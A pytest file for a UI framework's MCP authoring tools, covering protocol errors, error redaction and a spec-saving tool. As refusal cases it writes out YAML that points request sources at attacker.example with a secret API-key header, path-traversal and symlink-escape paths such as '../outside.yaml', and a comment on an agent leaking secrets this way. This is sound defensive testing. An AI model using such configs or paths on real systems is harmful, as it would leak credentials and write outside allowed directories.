"""The MCP authoring plane beyond the corpus: the protocol edges (resources/read, -32600), the tool
error boundary (caller mistakes as written, bugs generic, a refused request "Forbidden"), the
``__validate__`` reserved action (incl. ``load_failed``), the preview's reasons and
``mateu_save_spec`` with its path rule (Java's ``McpAuthoringSyncTest``)."""

from __future__ import annotations

import json
import logging
import os
import sys
from pathlib import Path

import pytest

from mateu_ui.core import MateuRegistry, RunActionRq, SyncHandler, dev_specs, mcp
from mateu_ui.core.authoring import resources, spec_writer
from mateu_ui.core.authoring.service import context_of, validate_uidl
from mateu_ui.uidl import UserFacingException, button, eyes_only, title, ui

MODULE = sys.modules[__name__]


@ui("mcp-auth-home")
@title("Authoring home")
class AuthHome:
    name: str = "Ada"

    @button()
    def explode(self):
        raise RuntimeError("db password is hunter2")


@ui("mcp-auth-secret")
@title("Secret")
@eyes_only(roles=("hr",))
class AuthSecret:
    total: str = "1M"


def handler() -> SyncHandler:
    return SyncHandler(MateuRegistry(MODULE))


def sync_fn(route, action_id, component_state, parameters):
    rq = RunActionRq(
        route=route or "",
        action_id=action_id or "",
        component_state=component_state or {},
        parameters=parameters or {},
    )
    return handler().handle(rq).model_dump(by_alias=True, mode="json")


def call(name, arguments, fn=sync_fn, **kwargs):
    r = mcp.handle_jsonrpc(
        {"jsonrpc": "2.0", "id": 9, "method": "tools/call", "params": {"name": name, "arguments": arguments}},
        fn,
        **kwargs,
    )
    return r["result"]


def text_of(result) -> str:
    return result["content"][0]["text"]


PAGE = "type: VerticalLayout\ncontent:\n  - type: Text\n    text: Hello\n"


# ── the protocol ────────────────────────────────────────────────────────────────────────────


def test_initialize_advertises_tools_and_resources():
    r = mcp.handle_jsonrpc({"id": 1, "method": "initialize"}, sync_fn)["result"]
    assert r["capabilities"] == {"tools": {}, "resources": {}}
    assert r["protocolVersion"] == "2024-11-05"


@pytest.mark.parametrize("message", [[], [{"id": 1}], 3, "x", None, True])
def test_a_json_value_that_is_not_an_object_is_an_invalid_request(message):
    assert mcp.handle_jsonrpc(message, sync_fn) == {
        "jsonrpc": "2.0", "id": None, "error": {"code": -32600, "message": "Invalid Request"},
    }


@pytest.mark.parametrize("resource", resources.RESOURCES, ids=lambda r: r.uri)
def test_resources_read_answers_the_packaged_text(resource):
    r = mcp.handle_jsonrpc({"id": 2, "method": "resources/read", "params": {"uri": resource.uri}}, sync_fn)
    assert r["result"] == {
        "contents": [{"uri": resource.uri, "mimeType": resource.mime_type, "text": resources.text(resource.file)}]
    }


def test_resources_read_without_uri_and_with_an_unknown_one():
    r = mcp.handle_jsonrpc({"id": 3, "method": "resources/read", "params": {}}, sync_fn)
    assert r["error"] == {"code": -32602, "message": "Invalid params: uri is required"}
    r = mcp.handle_jsonrpc({"id": 3, "method": "resources/read"}, sync_fn)
    assert r["error"]["code"] == -32602
    r = mcp.handle_jsonrpc({"id": 4, "method": "resources/read", "params": {"uri": "mateu://nope"}}, sync_fn)
    assert r["error"] == {"code": -32002, "message": "Resource not found: mateu://nope"}
    r = mcp.handle_jsonrpc({"id": 4, "method": "resources/read", "params": {"uri": 7}}, sync_fn)
    assert r["error"] == {"code": -32002, "message": "Resource not found: 7"}


def test_a_failing_non_tool_method_is_a_json_rpc_error(monkeypatch):
    def boom():
        raise RuntimeError("secret")

    monkeypatch.setattr(mcp, "_resources_list", boom)
    r = mcp.handle_jsonrpc({"id": 5, "method": "resources/list"}, sync_fn)
    assert r["error"]["code"] == -32603
    assert "secret" not in r["error"]["message"]
    assert r["error"]["message"].startswith("An unexpected error occurred. Reference: ")


# ── the tool error boundary ─────────────────────────────────────────────────────────────────


def test_caller_mistakes_are_shown_as_written():
    r = call("x", {})
    assert r["isError"] is True and text_of(r) == "Error: Unknown tool: x"
    r = call("mateu_validate_uidl", {})
    assert text_of(r) == 'Error: Missing argument "yaml".'
    r = call("mateu_validate_uidl", {"yaml": 3})
    assert text_of(r) == 'Error: Missing argument "yaml".'
    r = call("mateu_get_component_schema", {"type": "Zzzzzzzzz"})
    assert text_of(r) == 'Error: Unknown type "Zzzzzzzzz". See mateu_list_components.'


def test_a_bug_is_the_generic_text_with_a_reference_logged_at_error(caplog):
    def boom(*_):
        raise RuntimeError("db password is hunter2")

    with caplog.at_level(logging.ERROR, logger="mateu.errors"):
        r = call("mateu_describe_screen", {"route": "x"}, boom)
    text = text_of(r)
    assert r["isError"] is True
    assert text.startswith("Error: An unexpected error occurred. Reference: ")
    assert "hunter2" not in text
    reference = text.rsplit(" ", 1)[-1]
    assert any(reference in rec.getMessage() for rec in caplog.records)


def test_detailed_errors_show_the_raw_exception():
    def boom(*_):
        raise RuntimeError("the raw cause")

    assert "the raw cause" in text_of(call("mateu_describe_screen", {"route": "x"}, boom, detailed=True))


def test_a_user_facing_exception_is_shown_as_written():
    def refuse(*_):
        raise UserFacingException("Not today")

    assert text_of(call("mateu_describe_screen", {"route": "x"}, refuse)) == "Error: Not today"


def test_list_components_takes_a_query_of_any_scalar():
    assert json.loads(text_of(call("mateu_list_components", {})))["count"] > 100
    assert json.loads(text_of(call("mateu_list_components", {"query": 12345})))["count"] == 0
    assert json.loads(text_of(call("mateu_list_components", {"query": "Badge"})))["components"][0]["type"] == "Badge"


# ── over HTTP: a refused request is "Forbidden", a failing action a screen message ──────────


@pytest.fixture
def client():
    fastapi = pytest.importorskip("fastapi")
    from fastapi.testclient import TestClient

    from mateu_ui.fastapi import add_mateu

    app = fastapi.FastAPI()
    add_mateu(app, MODULE, mcp=True, dev=False)
    return TestClient(app)


def http_call(client, name, arguments):
    r = client.post(
        "/mateu/mcp",
        json={"jsonrpc": "2.0", "id": 7, "method": "tools/call", "params": {"name": name, "arguments": arguments}},
    )
    assert r.status_code == 200
    return r.json()["result"]


def test_a_refused_request_is_the_tool_error_forbidden(client):
    for name, arguments in (
        ("mateu_describe_screen", {"route": "mcp-auth-secret"}),
        ("mateu_run_action", {"route": "mcp-auth-secret", "actionId": ""}),
        ("mateu_preview_uidl", {"yaml": PAGE, "route": "mcp-auth-secret"}),
    ):
        r = http_call(client, name, arguments)
        assert r["isError"] is True, name
        assert text_of(r) == "Error: Forbidden", name


def test_a_failing_action_is_a_screen_with_the_generic_message_not_a_tool_error(client):
    r = http_call(client, "mateu_run_action", {"route": "mcp-auth-home", "actionId": "explode"})
    assert "isError" not in r
    screen = json.loads(text_of(r))
    assert screen["messages"][0]["type"] == "error"
    assert screen["messages"][0]["text"].startswith("An unexpected error occurred. Reference: ")
    assert "hunter2" not in text_of(r)


def test_a_non_object_message_over_http_is_an_invalid_request(client):
    r = client.post("/mateu/mcp", json=[1, 2])
    assert r.json()["error"] == {"code": -32600, "message": "Invalid Request"}
    r = client.post("/mateu/mcp", content=b"{nope", headers={"content-type": "application/json"})
    assert r.json()["error"]["code"] == -32700


def test_validate_and_preview_over_http(client):
    report = json.loads(text_of(http_call(client, "mateu_validate_uidl", {"yaml": PAGE})))
    assert report == {"valid": True, "kind": "component", "errors": [], "warnings": []}
    preview = json.loads(text_of(http_call(client, "mateu_preview_uidl", {"yaml": PAGE})))
    assert preview["rendered"] is True


# ── __validate__ ────────────────────────────────────────────────────────────────────────────


def test_the_validate_action_answers_the_report_on_app_data(monkeypatch):
    # outside an MCP tool call it answers only an app with MCP enabled or in dev mode (NM2)
    monkeypatch.setenv("MATEU_MCP_ENABLED", "true")
    wire = sync_fn("", "__validate__", None, {"_yaml": "foo: bar\n"})
    assert wire["appData"]["_validation"]["errors"][0]["code"] == "unknown_kind"
    empty = sync_fn("", "__validate__", None, None)
    assert empty["appData"]["_validation"]["errors"][0]["code"] == "empty"


def test_the_validate_action_is_refused_on_the_plain_sync_endpoint_when_mcp_and_dev_are_off(monkeypatch):
    monkeypatch.delenv("MATEU_MCP_ENABLED", raising=False)
    monkeypatch.delenv("MATEU_DEV", raising=False)
    from mateu_ui.core.action_guard import MateuForbiddenException

    with pytest.raises(MateuForbiddenException):
        sync_fn("", "__validate__", None, {"_yaml": "foo: bar\n"})
    # ...an MCP tool call is served (the endpoint marks its runs)
    result = call("mateu_validate_uidl", {"yaml": "foo: bar\n"})
    assert "unknown_kind" in text_of(result)
    # ...and so is an app that exposes its authoring plane
    h = handler()
    h.authoring_open = True
    rq = RunActionRq(action_id="__validate__", parameters={"_yaml": "foo: bar\n"})
    assert h.handle(rq).app_data["_validation"]["errors"][0]["code"] == "unknown_kind"


GANTT_WITH_A_BAD_DATE = (
    "type: Gantt\ntasks:\n  - id: a\n    title: Build\n    start: not-a-date\n    end: 2026-01-02\n"
)


def test_a_definition_the_loader_cannot_build_is_load_failed():
    report = validate_uidl(handler(), GANTT_WITH_A_BAD_DATE)
    assert report["valid"] is False
    assert report["kind"] == "component"
    (issue,) = report["errors"]
    assert issue["code"] == "load_failed"
    assert issue["path"] == "$"
    assert issue["message"].startswith("The definition could not be loaded: Gantt: ")
    assert "line" not in issue
    # the same page through the tool: not rendered, the reason given
    preview = mcp.dispatch_tool("mateu_preview_uidl", {"yaml": GANTT_WITH_A_BAD_DATE}, sync_fn)
    assert preview["rendered"] is False
    assert preview["reason"] == "The definition has errors; fix them first."


def test_only_loaded_kinds_go_through_the_loader():
    assert validate_uidl(handler(), "type: Routes\nroutes: []\n")["valid"] is True


def test_the_context_resolves_against_the_apps_catalogues():
    ctx = context_of(handler())
    assert ctx.source("no-such-source") is False
    assert ctx.partial("no-such-partial") is False
    assert ctx.component("NoSuchComponent") is False
    assert ctx.action("noSuchAction") is False
    assert ctx.field_type("noSuchType") is False

    class Broken:
        def get(self, name):
            raise RuntimeError("unreadable")

    class Partial:
        rest_sources = Broken()

    ctx = context_of(Partial())
    assert ctx.source("x") is True  # an unreadable catalogue is not the author's mistake
    assert ctx.component is None and ctx.action is None and ctx.field_type is None


# ── the preview ─────────────────────────────────────────────────────────────────────────────


def test_a_preview_of_something_that_is_not_a_page_is_not_rendered():
    preview = mcp.dispatch_tool("mateu_preview_uidl", {"yaml": "type: Routes\nroutes: []\n"}, sync_fn)
    assert preview == {
        "rendered": False,
        "reason": "Only a page (a component, or a layout: envelope) can be previewed.",
        "validation": {"valid": True, "kind": "routes", "errors": [], "warnings": []},
    }


def test_the_preview_action_says_why_it_cannot_render():
    def texts(yaml_text):
        found = []

        def walk(node):
            if isinstance(node, dict):
                md = node.get("metadata")
                if isinstance(md, dict) and md.get("type") == "Text":
                    found.append(md.get("text"))
                for v in node.values():
                    walk(v)
            elif isinstance(node, list):
                for v in node:
                    walk(v)

        walk(sync_fn("", "__preview__", None, {"_yaml": yaml_text}))
        return found

    assert texts("type: Text\ntext: a: b\n")[0].startswith("Invalid YAML — line 2")
    assert texts("layoutDelta:\n  hide: [x]\n") == ["Invalid or empty YAML"]
    assert texts("x" * 300_000) == ["The YAML is too large to preview"]
    assert texts(PAGE) == ["Hello"]


def test_a_validation_answer_without_a_report_raises_its_message():
    def failing(*_):
        return {"messages": [{"text": "Could not validate"}]}

    assert text_of(call("mateu_validate_uidl", {"yaml": PAGE}, failing)) == "Error: Could not validate"
    assert text_of(call("mateu_validate_uidl", {"yaml": PAGE}, lambda *_: {})) == "Error: validation failed"


# ── mateu_save_spec ─────────────────────────────────────────────────────────────────────────


@pytest.fixture
def dev(monkeypatch, tmp_path):
    specs = tmp_path / "specs"
    specs.mkdir()
    monkeypatch.setattr(dev_specs, "_forced", True)
    monkeypatch.setattr(dev_specs, "_dir", str(specs))
    return specs


def test_save_spec_is_unknown_outside_development_mode(monkeypatch):
    monkeypatch.setattr(dev_specs, "_forced", False)
    names = [t["name"] for t in mcp.handle_jsonrpc({"id": 1, "method": "tools/list"}, sync_fn)["result"]["tools"]]
    assert "mateu_save_spec" not in names
    r = call("mateu_save_spec", {"path": "a.yaml", "yaml": PAGE})
    assert r["isError"] is True and text_of(r) == "Error: Unknown tool: mateu_save_spec"


def test_save_spec_writes_a_valid_definition(dev):
    names = [t["name"] for t in mcp.handle_jsonrpc({"id": 1, "method": "tools/list"}, sync_fn)["result"]["tools"]]
    assert names[-1] == "mateu_save_spec"
    out = json.loads(text_of(call("mateu_save_spec", {"path": "partials/hello.yaml", "yaml": PAGE + "# é\n"})))
    written = (dev / "partials" / "hello.yaml").read_bytes()
    assert written == (PAGE + "# é\n").encode("utf-8")
    assert out["saved"] is True and out["path"] == "partials/hello.yaml" and out["bytes"] == len(written)
    assert out["validation"]["valid"] is True


def test_save_spec_writes_nothing_when_the_definition_has_errors(dev):
    out = json.loads(text_of(call("mateu_save_spec", {"path": "bad.yml", "yaml": "foo: bar\n"})))
    assert out["saved"] is False
    assert out["reason"] == "The definition has errors; nothing was written."
    assert out["validation"]["errors"][0]["code"] == "unknown_kind"
    assert not (dev / "bad.yml").exists()


# NM3: an agent saves what a screen is made of, never what decides a request — so in dev mode it
# cannot re-point a proxied source at its own server and have Mateu send it the secret.
AGENT_REFUSED = [
    ("pay.yaml", "type: Sources\nsources:\n  - name: pay\n    source:\n      url: https://x\n"),
    ("prod.yaml", "type: Environment\nsources:\n  pay:\n    url: https://attacker.example\n"),
    ("r.yaml", "type: Routes\nroutes:\n  - route: x\n    layout: x.yaml\n"),
    ("p1.yaml", "type: Button\nlabel: Go\nactionId: go\nrestAction:\n  source:\n    url: https://attacker.example\n"
     "    headers:\n      X-Api-Key: ${secret.API_KEY}\n"),
    ("p2.yaml", "type: Button\nlabel: Go\nactionId: go\nrestAction:\n  source:\n    url: https://attacker.example\n"
     "    proxy: true\n"),
    ("p3.yaml", "type: Button\nlabel: Go\nactionId: go\nrestAction:\n  source:\n    ref: payments\n"
     "    url: https://attacker.example\n"),
]


@pytest.mark.parametrize("path,text", AGENT_REFUSED)
def test_save_spec_refuses_what_could_repoint_a_request_or_leak_a_secret(dev, path, text):
    out = json.loads(text_of(call("mateu_save_spec", {"path": path, "yaml": text})))
    assert out["saved"] is False
    assert out["reason"].startswith(
        ("Only a page, a partial or a business-component catalogue can be saved by an agent;",
         "A definition saved by an agent may not reference a secret,")
    )
    assert not (dev / path).exists()


@pytest.mark.parametrize("path", ["sources.yaml", "x/routes.yml", "environments/prod.yaml"])
def test_save_spec_refuses_a_catalogue_file_whatever_it_holds(dev, path):
    r = call("mateu_save_spec", {"path": path, "yaml": PAGE})
    assert r["isError"] is True
    assert text_of(r) == (
        f'Error: Refused path "{path}": catalogue files (sources, routes, actions, types, project,'
        " environments, translations) are written by hand."
    )
    assert not (dev / path).exists()


def test_save_spec_without_a_specs_directory(monkeypatch, tmp_path):
    monkeypatch.setattr(dev_specs, "_forced", True)
    monkeypatch.setattr(dev_specs, "_dir", str(tmp_path / "missing"))
    r = call("mateu_save_spec", {"path": "a.yaml", "yaml": PAGE})
    assert text_of(r) == "Error: No specs directory found (set MATEU_DEV_SPECS_DIR)."


def test_save_spec_needs_both_arguments(dev):
    assert text_of(call("mateu_save_spec", {"yaml": PAGE})) == 'Error: Missing argument "path".'
    assert text_of(call("mateu_save_spec", {"path": "a.yaml"})) == 'Error: Missing argument "yaml".'


REFUSED = [
    "../outside.yaml",
    "a/../../outside.yaml",
    "/etc/passwd.yaml",
    "./a.yaml",
    "a//b.yaml",
    "notes.txt",
    "a\\b.yaml",
    "C:/x.yaml",
    "nul\0.yaml",
    "",
    "   ",
    "a/" * 130 + "x.yaml",
    "a/./b.yaml",
    "a/",
]


@pytest.mark.parametrize("path", REFUSED, ids=repr)
def test_save_spec_refuses_paths_outside_the_rule(dev, path):
    r = call("mateu_save_spec", {"path": path, "yaml": PAGE})
    assert r["isError"] is True
    assert text_of(r) == "Error: " + spec_writer.refusal(path)
    assert list(dev.rglob("*")) == []


def test_the_refusal_message():
    assert spec_writer.refusal('a"b') == (
        'Invalid path "a\\"b": give a relative .yaml or .yml path inside the specs directory'
        ' (no "..", no absolute path).'
    )
    assert spec_writer.refusal(None).startswith('Invalid path "":')


@pytest.mark.skipif(not hasattr(os, "symlink"), reason="no symbolic links here")
def test_save_spec_refuses_to_follow_a_symbolic_link_out(dev, tmp_path):
    outside = tmp_path / "outside"
    outside.mkdir()
    (dev / "escape").symlink_to(outside, target_is_directory=True)
    r = call("mateu_save_spec", {"path": "escape/x.yaml", "yaml": PAGE})
    assert text_of(r) == "Error: " + spec_writer.refusal("escape/x.yaml")
    assert list(outside.iterdir()) == []
    # a file link pointing out is refused too
    target = outside / "victim.yaml"
    target.write_text("keep")
    (dev / "link.yaml").symlink_to(target)
    r = call("mateu_save_spec", {"path": "link.yaml", "yaml": PAGE})
    assert text_of(r) == "Error: " + spec_writer.refusal("link.yaml")
    assert target.read_text() == "keep"
    # a link that stays inside is followed
    (dev / "inside").mkdir()
    (dev / "alias").symlink_to(dev / "inside", target_is_directory=True)
    out = json.loads(text_of(call("mateu_save_spec", {"path": "alias/ok.yaml", "yaml": PAGE})))
    assert out["saved"] is True and (dev / "inside" / "ok.yaml").is_file()


def test_the_writer_refuses_a_bad_path_on_its_own(tmp_path):
    with pytest.raises(UserFacingException):
        spec_writer.write(tmp_path, "../x.yaml", PAGE)
    assert spec_writer.write(tmp_path, "deep/er/x.yaml", "a: 1\n") == 5
    assert spec_writer.is_acceptable("ok.yml") and not spec_writer.is_acceptable(None)


def test_the_writer_refuses_a_target_outside_after_normalising(tmp_path, monkeypatch):
    # is_acceptable already refuses "..": force the normalised-escape branch directly
    monkeypatch.setattr(spec_writer, "is_acceptable", lambda p: True)
    with pytest.raises(UserFacingException):
        spec_writer.write(tmp_path / "base", "../x.yaml", PAGE)


def test_a_search_with_non_dict_filters_and_a_bad_arguments_value():
    calls = []

    def fake(route, action_id, state, params):
        calls.append((route, action_id, state, params))
        return {"fragments": []}

    mcp.dispatch_tool("mateu_search", {"route": "b", "filters": "nope", "searchText": 7}, fake)
    mcp.dispatch_tool("mateu_run_action", {"route": "b", "actionId": "go", "componentState": [1]}, fake)
    mcp.dispatch_tool("mateu_describe_screen", "not-a-dict", fake)
    assert calls == [
        ("b", "search", {"searchText": "7"}, {"searchText": "7"}),
        ("b", "go", None, None),
        ("", "", None, None),
    ]
    assert Path(spec_writer.__file__).is_file()
